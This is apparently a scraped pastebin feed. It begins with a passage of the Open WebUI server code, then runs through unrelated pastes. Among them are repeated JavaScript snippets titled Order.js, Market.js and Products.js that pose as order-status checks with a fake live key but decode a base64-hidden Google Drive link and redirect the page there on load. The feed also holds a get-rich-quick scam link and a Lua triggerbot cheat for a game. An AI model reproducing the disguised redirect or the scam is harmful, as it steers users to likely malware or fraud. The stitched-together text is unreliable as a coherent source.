async def chat_action(
    request: Request, action_id: str, form_data: dict, user=Depends(get_verified_user)
):
    try:
        model_item = form_data.pop(""model_item"", {})

        if model_item.get(""direct"", False):
            request.state.direct = True
            request.state.model = model_item

        return await chat_action_handler(request, action_id, form_data, user)
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )


@app.post(""/api/tasks/stop/{task_id}"")
async def stop_task_endpoint(task_id: str, user=Depends(get_verified_user)):
    try:
        result = await stop_task(task_id)
        return result
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=str(e))


@app.get(""/api/tasks"")
async def list_tasks_endpoint(user=Depends(get_verified_user)):
    return {""tasks"": list_tasks()}


@app.get(""/api/tasks/chat/{chat_id}"")
async def list_tasks_by_chat_id_endpoint(chat_id: str, user=Depends(get_verified_user)):
    chat = Chats.get_chat_by_id(chat_id)
    if chat is None or chat.user_id != user.id:
        return {""task_ids"": []}

    task_ids = list_task_ids_by_chat_id(chat_id)

    print(f""Task IDs for chat {chat_id}: {task_ids}"")
    return {""task_ids"": task_ids}


##################################
#
# Config Endpoints
#
##################################


@app.get(""/api/config"")
async def get_app_config(request: Request):
    user = None
    if ""token"" in request.cookies:
        token = request.cookies.get(""token"")
        try:
            data = decode_token(token)
        except Exception as e:
            log.debug(e)
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail=""Invalid token"",
            )
        if data is not None and ""id"" in data:
            user = Users.get_user_by_id(data[""id""])

    user_count = Users.get_num_users()
    onboarding = False

    if user is None:
        onboarding = user_count == 0

    return {
        **({""onboarding"": True} if onboarding else {}),
        ""status"": True,
        ""name"": app.state.WEBUI_NAME,
        ""version"": VERSION,
        ""default_locale"": str(DEFAULT_LOCALE),
        ""oauth"": {
            ""providers"": {
                name: config.get(""name"", name)
                for name, config in OAUTH_PROVIDERS.items()
            }
        },
        ""features"": {
            ""auth"": WEBUI_AUTH,
            ""auth_trusted_header"": bool(app.state.AUTH_TRUSTED_EMAIL_HEADER),
            ""enable_ldap"": app.state.config.ENABLE_LDAP,
            ""enable_api_key"": app.state.config.ENABLE_API_KEY,
            ""enable_signup"": app.state.config.ENABLE_SIGNUP,
            ""enable_login_form"": app.state.config.ENABLE_LOGIN_FORM,
            ""enable_websocket"": ENABLE_WEBSOCKET_SUPPORT,
            **(
                {
                    ""enable_direct_connections"": app.state.config.ENABLE_DIRECT_CONNECTIONS,
                    ""enable_channels"": app.state.config.ENABLE_CHANNELS,
                    ""enable_web_search"": app.state.config.ENABLE_WEB_SEARCH,
                    ""enable_code_execution"": app.state.config.ENABLE_CODE_EXECUTION,
                    ""enable_code_interpreter"": app.state.config.ENABLE_CODE_INTERPRETER,
                    ""enable_image_generation"": app.state.config.ENABLE_IMAGE_GENERATION,
                    ""enable_autocomplete_generation"": app.state.config.ENABLE_AUTOCOMPLETE_GENERATION,
                    ""enable_community_sharing"": app.state.config.ENABLE_COMMUNITY_SHARING,
                    ""enable_message_rating"": app.state.config.ENABLE_MESSAGE_RATING,
                    ""enable_user_webhooks"": app.state.config.ENABLE_USER_WEBHOOKS,
                    ""enable_admin_export"": ENABLE_ADMIN_EXPORT,
                    ""enable_admin_chat_access"": ENABLE_ADMIN_CHAT_ACCESS,
                    ""enable_google_drive_integration"": app.state.config.ENABLE_GOOGLE_DRIVE_INTEGRATION,
                    ""enable_onedrive_integration"": app.state.config.ENABLE_ONEDRIVE_INTEGRATION,
                }
                if user is not None
                else {}
            ),
        },
        **(
            {
                ""default_models"": app.state.config.DEFAULT_MODELS,
                ""default_prompt_suggestions"": app.state.config.DEFAULT_PROMPT_SUGGESTIONS,
                ""user_count"": user_count,
                ""code"": {
                    ""engine"": app.state.config.CODE_EXECUTION_ENGINE,
                },
                ""audio"": {
                    ""tts"": {
                        ""engine"": app.state.config.TTS_ENGINE,
                        ""voice"": app.state.config.TTS_VOICE,
                        ""split_on"": app.state.config.TTS_SPLIT_ON,
                    },
                    ""stt"": {
                        ""engine"": app.state.config.STT_ENGINE,
                    },
                },
                ""file"": {
                    ""max_size"": app.state.config.FILE_MAX_SIZE,
                    ""max_count"": app.state.config.FILE_MAX_COUNT,
                },
                ""permissions"": {**app.state.config.USER_PERMISSIONS},
                ""google_drive"": {
                    ""client_id"": GOOGLE_DRIVE_CLIENT_ID.value,
                    ""api_key"": GOOGLE_DRIVE_API_KEY.value,
                },
                ""onedrive"": {""client_id"": ONEDRIVE_CLIENT_ID.value},
                ""license_metadata"": app.state.LICENSE_METADATA,
                **(
                    {
                        ""active_entries"": app.state.USER_COUNT,
                    }
                    if user.role == ""admin""
                    else {}
                ),
            }
            if user is not None
            else {}
        ),
    }


class UrlForm(BaseModel):
    url: str


@app.get(""/api/webhook"")
async def get_webhook_url(user=Depends(get_admin_user)):
    return {
        ""url"": app.state.config.WEBHOOK_URL,
    }


@app.post(""/api/webhook"")
async def update_webhook_url(form_data: UrlForm, user=Depends(get_admin_user)):
    app.state.config.WEBHOOK_URL = form_data.url
    app.state.WEBHOOK_URL = app.state.config.WEBHOOK_URL
    return {""url"": app.state.config.WEBHOOK_URL}


@app.get(""/api/version"")
async def get_app_version():
    return {
        ""version"": VERSION,
    }


@app.get(""/api/version/updates"")
async def get_app_latest_release_version(user=Depends(get_verified_user)):
    if OFFLINE_MODE:
        log.debug(
            f""Offline mode is enabled, returning current version as latest version""
        )
        return {""current"": VERSION, ""latest"": VERSION}
    try:
        timeout = aiohttp.ClientTimeout(total=1)
        async with aiohttp.ClientSession(timeout=timeout, trust_env=True) as session:
            async with session.get(
                ""https://api.github.com/repos/open-webui/open-webui/releases/latest""
            ) as response:
                response.raise_for_status()
                data = await response.json()
                latest_version = data[""tag_name""]

                return {""current"": VERSION, ""latest"": latest_version[1:]}
    except Exception as e:
        log.debug(e)
        return {""current"": VERSION, ""latest"": VERSION}


@app.get(""/api/changelog"")
async def get_app_changelog():
    return {key: CHANGELOG[key] for idx, key in enumerate(CHANGELOG) if idx < 5}


############################
# OAuth Login & Callback
############################

# SessionMiddleware is used by authlib for oauth
if len(OAUTH_PROVIDERS) > 0:
    app.add_middleware(
        SessionMiddleware,
        secret_key=WEBUI_SECRET_KEY,
        session_cookie=""oui-session"",
        same_site=WEBUI_SESSION_COOKIE_SAME_SITE,
        https_only=WEBUI_SESSION_COOKIE_SECURE,
    )


@app.get(""/oauth/{provider}/login"")
async def oauth_login(provider: str, request: Request):
    return await oauth_manager.handle_login(request, provider)


# OAuth login logic is as follows:
# 1. Attempt to find a user with matching subject ID, tied to the provider
# 2. If OAUTH_MERGE_ACCOUNTS_BY_EMAIL is true, find a user with the email address provided via OAuth
#    - This is considered insecure in general, as OAuth providers do not always verify email addresses
# 3. If there is no user, and ENABLE_OAUTH_SIGNUP is true, create a user
#    - Email addresses are considered unique, so we fail registration if the email address is already taken
@app.get(""/oauth/{provider}/callback"")
async def oauth_callback(provider: str, request: Request, response: Response):
    return await oauth_manager.handle_callback(request, provider, response)


@app.get(""/manifest.json"")
async def get_manifest_json():
    if app.state.EXTERNAL_PWA_MANIFEST_URL:
        return requests.get(app.state.EXTERNAL_PWA_MANIFEST_URL).json()
    else:
        return {
            ""name"": app.state.WEBUI_NAME,
            ""short_name"": app.state.WEBUI_NAME,
            ""description"": ""Open WebUI is an open, extensible, user-friendly interface for AI that adapts to your workflow."",
            ""start_url"": ""/"",
            ""display"": ""standalone"",
            ""background_color"": ""#343541"",
            ""orientation"": ""natural"",
            ""icons"": [
                {
                    ""src"": ""/static/logo.png"",
                    ""type"": ""image/png"",
                    ""sizes"": ""500x500"",
                    ""purpose"": ""any"",
                },
                {
                    ""src"": ""/static/logo.png"",
                    ""type"": ""image/png"",
                    ""sizes"": ""500x500"",
                    ""purpose"": ""maskable"",
                },
            ],
        }


@app.get(""/opensearch.xml"")
async def get_opensearch_xml():
    xml_content = rf""""""
    <OpenSearchDescription xmlns=""http://a9.com/-/spec/opensearch/1.1/"" xmlns:moz=""http://www.mozilla.org/2006/browser/search/"">
    <ShortName>{app.state.WEBUI_NAME}</ShortName>
    <Description>Search {app.state.WEBUI_NAME}</Description>
    <InputEncoding>UTF-8</InputEncoding>
    <Image width=""16"" height=""16"" type=""image/x-icon"">{app.state.config.WEBUI_URL}/static/favicon.png</Image>
    <Url type=""text/html"" method=""get"" template=""{app.state.config.WEBUI_URL}/?q={""{searchTerms}""}""/>
    <moz:SearchForm>{app.state.config.WEBUI_URL}</moz:SearchForm>
    </OpenSearchDescription>
    """"""
    return Response(content=xml_content, media_type=""application/xml"")


@app.get(""/health"")
async def healthcheck():
    return {""status"": True}


@app.get(""/health/db"")
async def healthcheck_with_db():
    Session.execute(text(""SELECT 1;"")).all()
    return {""status"": True}


app.mount(""/static"", StaticFiles(directory=STATIC_DIR), name=""static"")
app.mount(""/cache"", StaticFiles(directory=CACHE_DIR), name=""cache"")


def swagger_ui_html(*args, **kwargs):
    return get_swagger_ui_html(
        *args,
        **kwargs,
        swagger_js_url=""/static/swagger-ui/swagger-ui-bundle.js"",
        swagger_css_url=""/static/swagger-ui/swagger-ui.css"",
        swagger_favicon_url=""/static/swagger-ui/favicon.png"",
    )


applications.get_swagger_ui_html = swagger_ui_html

if os.path.exists(FRONTEND_BUILD_DIR):
    mimetypes.add_type(""text/javascript"", "".js"")
    app.mount(
        ""/"",
        SPAStaticFiles(directory=FRONTEND_BUILD_DIR, html=True),
        name=""spa-static-files"",
    )
else:
    log.warning(
        f""Frontend build directory not found at '{FRONTEND_BUILD_DIR}'. Serving API only.""
    )
"
0nfNmB6z,Order.js,dentira,JavaScript,Thursday 17th of April 2025 06:15:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22857/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6at1a4FF,Make $1000 15-MINUTES (BEGINNER) FM,Manunu,JavaScript,Thursday 17th of April 2025 06:09:15 AM CDT," 
Pdf https://tinyurl.com/privguidee


TMgXyFkpPz
"
iwTWGKVN,dataNone,TestGuy1,JSON,Thursday 17th of April 2025 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8ad564386fd16cd400e1455169f2235cba36ba771a5cc4a36f7f92c7d4992e4dbd2700b1988e6b56c81009c6e0cf16c2cd98437f5af7d310c04010ed92411415154f30b0afa628c3943c71d2bc86df38eb66f8fb7c5b3457e87920ed2215afabd2ea3c6e914d3e96ee1746de45055b76158245477bec1612ffd6fa1e9d8eaccb',
  otherdata: [
    '9bca28d26e3fb11e5033117e09c93957',
    'e2a52d45d97e1a1ac82139fae539158f',
    'f4c2a2dfba15e9317e8e3226f6b9dc41',
    '1a91694f81d35bcf56854fffc4259569',
    '22b9c65229a53ee9f716dade52fab618',
    '0148f7ab4bf86304acb5e4c83f454084',
    'e4bbaf484882b75a81a6f45b3a5ee80e',
    '6ab9eeadba88034b3be1667d63590d80'
  ]
}"
M21taEfa,Market.js,dentira,JavaScript,Thursday 17th of April 2025 05:59:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70364/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KRuGNqnr,2025-04-17T12:58:00.921424,powerampache,PHP,Thursday 17th of April 2025 05:58:00 AM CDT,"1.00-68 (68) - DB: 82
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.app.ActivityThread.main(ActivityThread.java:8934)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:578)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1103)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
Kiqh0d20,Untitled,dentira,JavaScript,Thursday 17th of April 2025 05:44:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82498/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rQr0UaZd,javascript download generated file,rgruber,JavaScript,Thursday 17th of April 2025 05:38:53 AM CDT,"function download1(content, fileName) {
  const blob = new Blob([content], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = fileName || 'download.txt';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}"
0RGVWJXF,Products.js,dentira,JavaScript,Thursday 17th of April 2025 05:29:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
w1nn1dz7,Order.js,dentira,JavaScript,Thursday 17th of April 2025 05:13:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99178/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KyiL64kz,Market.js,dentira,JavaScript,Thursday 17th of April 2025 04:58:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99399/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S4vYDV6Z,Untitled,dentira,JavaScript,Thursday 17th of April 2025 04:42:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20600/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GaXXAuQ7,2025-04-17T12:40:28.758598,powerampache,PHP,Thursday 17th of April 2025 04:40:29 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.app.ActivityThread.main(ActivityThread.java:8919)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:578)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1103)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
V1JF6sjK,Untitled,zpolice281,Lua,Thursday 17th of April 2025 04:37:14 AM CDT,"-- Find where combatSection is created and add these lines after it:

-- Add triggerbot toggle
self:CreateToggle(combatSection, ""Enable Triggerbot"", false, function(enabled)
    triggerbotEnabled = enabled
    self:SetupTriggerbot()
end)

-- Add team check toggle
self:CreateToggle(combatSection, ""Team Check"", true, function(enabled)
    triggerbotTeamCheck = enabled
    self:ShowNotification(""Triggerbot"", ""Team check "" .. (enabled and ""enabled"" or ""disabled""), 3)
end)

-- Add delay slider
self:CreateSlider(combatSection, ""Delay (seconds)"", 0, 1, 0.1, function(value)
    triggerbotDelay = value
    self:ShowNotification(""Triggerbot"", ""Delay set to "" .. value .. "" seconds"", 3)
end)
"
33mrN3k9,Tailwind Nav,tommyosheawebdesign,HTML,Thursday 17th of April 2025 04:30:33 AM CDT,"<header class=""shadow mb-2"">
<div class=""relative flex max-w-screen-xl flex-col overflow-hidden px-4 py-4 md:mx-auto md:flex-row md:items-center"">
  <a href=""#"" class=""flex items-center whitespace-nowrap text-2xl font-black"">
    <span class=""mr-2 text-4xl text-blue-600"">
      <svg xmlns=""http://www.w3.org/2000/svg"" aria-hidden=""true"" role=""img"" width=""1em"" height=""1em"" preserveAspectRatio=""xMidYMid meet"" viewBox=""0 0 24 24""><path fill=""currentColor"" d=""M6.925 16.875Q5.2 16.225 4.1 14.713Q3 13.2 3 11.25q0-1.975.938-3.513Q4.875 6.2 6 5.15q1.125-1.05 2.062-1.6L9 3v2.475q0 .625.45 1.062q.45.438 1.075.438q.35 0 .65-.15q.3-.15.5-.425L12 6q.95.55 1.625 1.35t1.025 1.8l-1.675 1.675q-.05-.6-.287-1.175q-.238-.575-.638-1.05q-.35.2-.738.287q-.387.088-.787.088q-1.1 0-1.987-.612Q7.65 7.75 7.25 6.725q-.95.925-1.6 2.062Q5 9.925 5 11.25q0 .775.275 1.462q.275.688.75 1.213q.05-.5.287-.938q.238-.437.588-.787L9 10.1l2.15 2.1q.05.05.1.125t.1.125l-1.425 1.425q-.05-.075-.087-.125q-.038-.05-.088-.1L9 12.925l-.7.7q-.125.125-.212.287q-.088.163-.088.363q0 .3.175.537q.175.238.45.363ZM9 10.1Zm0 0ZM7.4 22L6 20.6L19.6 7L21 8.4L17.4 12H21v2h-5.6l-.5.5l1.5 1.5H21v2h-2.6l2.1 2.1l-1.4 1.4l-2.1-2.1V22h-2v-4.6l-1.5-1.5l-.5.5V22h-2v-3.6Z"" /></svg>
    </span>
    <span class=""text-black"">the future</span>
  </a>
  <input type=""checkbox"" class=""peer hidden"" id=""navbar-open"" />
  <label class=""absolute top-5 right-7 cursor-pointer md:hidden"" for=""navbar-open"">
    <span class=""sr-only"">Toggle Navigation</span>
    <svg xmlns=""http://www.w3.org/2000/svg"" class=""h-6 w-6"" fill=""none"" viewBox=""0 0 24 24"" stroke=""currentColor"" stroke-width=""2"">
      <path stroke-linecap=""round"" stroke-linejoin=""round"" d=""M4 6h16M4 12h16M4 18h16"" />
    </svg>
  </label>
  <nav aria-label=""Header Navigation"" class=""peer-checked:mt-8 peer-checked:max-h-56 flex max-h-0 w-full flex-col items-center justify-between overflow-hidden transition-all md:ml-24 md:max-h-full md:flex-row md:items-start"">
    <ul class=""flex flex-col items-center space-y-2 md:ml-auto md:flex-row md:space-y-0"">
      <li class=""text-gray-600 md:mr-12 hover:text-blue-600""><a href=""#"">Pricing</a></li>
      <li class=""text-gray-600 md:mr-12 hover:text-blue-600""><a href=""#"">Features</a></li>
      <li class=""text-gray-600 md:mr-12 hover:text-blue-600""><a href=""#"">Support</a></li>
      <li class=""text-gray-600 md:mr-12 hover:text-blue-600"">
        <button class=""rounded-md border-2 border-blue-600 px-6 py-1 font-medium text-blue-600 transition-colors hover:bg-blue-600 hover:text-white"">083 1985 855</button>
      </li>
    </ul>
  </nav>
</div>
</header>
"
pjwCzzEN,Products.js,Epiphemeral,JavaScript,Thursday 17th of April 2025 04:27:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83197/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zJ1dbNUT,Beta_backupscript,DistNZ,PowerShell,Thursday 17th of April 2025 04:22:34 AM CDT,"# PowerShell Backup Script with Progress Indicator, Email Notifications, and Logging

# Load Config from JSON file
$configFile = "".\config.json""
$config = Get-Content $configFile | ConvertFrom-Json

# General Settings
$PlexServerName = $config.General.PlexServerName
$backupDestination = $config.General.BackupDestination
$tempBackupDir = $config.General.TempBackupDir
$logDir = $config.General.LogDir
$sevenZipPath = $config.General.SevenZipPath
$logRetentionDays = [int]$config.General.LogRetentionDays
$backupRetentionCount = [int]$config.General.BackupRetentionCount

# Email Settings
$emailTo = $config.Email.To
$emailFrom = $config.Email.From
$emailUsername = $config.Email.Username
$emailPassword = $config.Email.Password
$smtpServer = $config.Email.SmtpServer
$smtpPort = $config.Email.SmtpPort
$useSsl = $config.Email.UseSsl

# Source Directories
$sources = $config.Sources

# Log File and Directory Setup
$timestamp = Get-Date -Format ""yyyyMMdd_HHmmss""
$logFileDir = $logDir
$logFile = Join-Path $logFileDir ""PlexServerBackup_$timestamp.log""

# Start logging
Start-Transcript -Path $logFile

# Create log directory if it doesn't exist
if (-not (Test-Path $logFileDir)) {
    New-Item -ItemType Directory -Force -Path $logFileDir
}

# Helper function to send emails
function Send-Email {
    param(
        [string]$subject,
        [string]$body
    )

    $mailMessage = New-Object system.net.mail.mailmessage
    $mailMessage.From = ($emailFrom)
    $mailMessage.To.Add($emailTo)
    $mailMessage.Subject = $subject
    $mailMessage.Body = $body
    $mailMessage.IsBodyHtml = $true

    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtp.Credentials = New-Object System.Net.NetworkCredential($emailUsername, $emailPassword)
    $smtp.EnableSsl = $useSsl
    $smtp.Send($mailMessage)
}

# Backup Process with Progress Bar
$totalSources = $sources.PSObject.Properties.Count
$counter = 0
$backupSuccess = $true

foreach ($name in $sources.PSObject.Properties.Name) {
    $counter++
    $sourcePath = $sources.$name

    # Display Progress
    $percentageComplete = ($counter / $totalSources) * 100
    $progressBar = ""["" + (""#"" * [math]::Round($percentageComplete / 5)) + ("" "" * (20 - [math]::Round($percentageComplete / 5))) + ""]""
    Write-Host ""`rProgress: $progressBar $($percentageComplete.ToString(""F2""))% - Backing up $name..."" -NoNewline

    if (Test-Path $sourcePath) {
        # Backup using robocopy
        $robocopyLog = Join-Path $tempBackupDir ""$name-robocopy.log""
        robocopy $sourcePath $tempBackupDir /E /Z /COPYALL /R:3 /W:5 | Out-File -Append -FilePath $robocopyLog
        Add-Content -Path $logFile -Value ""Robocopy log for $name: $robocopyLog""
    } else {
        Write-Host ""`rProgress: $progressBar $($percentageComplete.ToString(""F2""))% - Skipping $name: Source not found"" -NoNewline
